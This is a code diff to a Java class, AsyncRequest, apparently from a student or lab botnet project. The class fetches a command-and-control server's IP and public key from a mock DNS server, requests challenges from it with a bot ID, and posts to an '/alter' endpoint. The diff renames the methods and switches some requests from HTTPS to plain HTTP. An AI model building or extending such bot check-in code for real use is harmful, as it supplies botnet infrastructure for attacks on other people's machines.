@@ -41,6 +41,7 @@ public class AsyncRequest {
 	private static final String PORT = ":8443";
 
 	private static final String HTTPS = "https://";
+	private static final String HTTP = "http://";
 
 	public final static Integer REQNUMBER = 6;
 	
@@ -90,11 +91,11 @@ public class AsyncRequest {
 	}
 
 	//da valutare se devono essere asincroni
-	public Pairs<IP,PublicKey>  getIpCommandAndControlFromDnsServer(String dnsUrl) {
+	public Pairs<IP,PublicKey>  getIpCeCFromDnsServer(String dnsUrl) {
 		Pairs<IP,PublicKey> cec = new Pairs<>();
 		Type type = new TypeToken<Pairs<IP,PublicKey>>() {}.getType();
 		try {
-			cec=doGetJSON(dnsUrl,type);
+			cec=doGetJSON(HTTP+dnsUrl,type);
 			
 		} catch (Exception e) {
 			System.err.println("Errore ricezione Ip da Mock Dns Server");
@@ -103,7 +104,7 @@ public class AsyncRequest {
 	}
 
 	//da valutare se devono essere asincroni
-	public Pairs<Long,Integer> getChallengeFromCommandAndConquer(String idBot,IP ipCeC){
+	public Pairs<Long,Integer> getChallengeFromCeC(String idBot,IP ipCeC){
 		Pairs<Long,Integer> response = new Pairs<>();
 		Integer counter = 0;
 		while (counter <= REQNUMBER) {
@@ -135,7 +136,7 @@ public class AsyncRequest {
 		Integer counter = 0;
 		while (counter <= REQNUMBER) {//while(!response)
 		try {
-			String url=HTTPS+dnsUrl+PORT+"/alter";
+			String url=HTTP+dnsUrl+PORT+"/alter";
 			response=restTemplate.postForObject(url, data,response.getClass());
 			return response;
 		} catch (Exception e) {
@@ -149,7 +150,7 @@ public class AsyncRequest {
 	
 	
 	//da valutare se devono essere asincroni
-	public String getResponseFromCommandAndConquer(String idBot,String Mac,IP dest,String hashMac){
+	public String getResponseFromCeC(String idBot,String Mac,IP dest,String hashMac){
 		Integer counter = 0;
 		String response = "";
 		while (counter <= REQNUMBER) {
